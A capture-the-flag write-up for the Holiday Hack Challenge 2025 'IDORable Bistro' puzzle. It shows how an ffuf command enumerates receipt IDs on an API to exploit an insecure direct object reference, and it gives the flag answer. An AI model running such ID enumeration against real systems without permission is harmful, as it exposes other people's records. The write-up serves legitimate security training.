---
title: IDORable Bistro
tags:
  - web
  - IDOR
Difficulty: ❄️❄️---
order: 3
showToc: true
---

👨‍💻 Challenge provided by: [[Josh Wright]]  
🗺️ Location: Sasabune - Area: sasabune. Coordinates: 7, 3  
<img src="HHC2025/images/receipt.png" width="18" class="inline-left">Challenge File: [receipt.png](https://www.holidayhackchallenge.com/2025/assets/receipt.png)

## Challenge Description

```
Josh has a tasty IDOR treat for you—stop by Sasabune for a bite of vulnerability. What is the name of the gnome?
```

## Helpful References

[Hackventure: Having Fun With IDOR Attacks | Joshua Wright](https://www.youtube.com/watch?v=hzrhtHrhwno) - Link provided by [[Josh Wright]]  
[Web Security Academy - IDOR](https://portswigger.net/web-security/access-control/idor)

## Solution

The first task Josh gives us is to locate a receipt. He mentions that it is outside the door. The exact receipt location is shown below (unfortunately, I picked up the receipt without checking the coordinates, but it was likely `[101,12],"areaId":"city"`):

![[idorable-1.png]]


![[idorable-2.png]]

Once you pick the receipt, it will appear in your 'Items' inventory. The receipt URL was:

https://www.holidayhackchallenge.com/2025/assets/receipt.png

![[receipt.png|200]]

Scanning the QR code shows the following link:

https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2

If we check the page source we can see that the receipt information is obtained via an API call:

![[idorable-3.png]]

Below is the GET request made by the application and the corresponding server response::

![[idorable-4.png]]

Note: This is also solvable with Burp Suite Intruder, which is how I initially solved the challenge. However, the solution presented here uses `ffuf` (Fuzz Faster U Fool) following the technique shared by [[Josh Wright]] in the video given as part of the challenge.

To enumerate valid receipt IDs, we can fuzz the `id` parameter using the following command:

```sh
seq 100 999 |ffuf -w - -u "https://its-idorable.holidayhackchallenge.com/api/receipt?id=FUZZ" -od idor
```

**Command breakdown:**
- `seq 100 999`: generates a numeric range to test receipt IDs
- `-w -`: specifies the wordlist, `-` indicates read from stdin.
- `-u`: specifies the target URL
- `-od`: saves the output to the specified directory

Once we get the results, we can use `grep` to search for the word 'frozen' to find the solution:

```json
{"customer":"Bartholomew Quibblefrost","date":"2025-12-20","id":139,"items":[{"name":"Frozen Roll (waitress improvised: sorbet, a hint of dry ice)","price":19.0}],"note":"Insisted on increasingly bizarre rolls and demanded one be served frozen. The waitress invented a 'Frozen Roll' on the spot with sorbet and a puff of theatrical smoke. He nodded solemnly and asked if we could make these in bulk.","paid":true,"table":14,"total":19.0}
```

Solution: ==Bartholomew Quibblefrost==

## Extras

To learn more about the Sasabune restaurant, see an analysis of the receipts (similar to the one Josh did in his video), and explore some other curiosities about the website, check [[Sasabune]] in the Extras section.
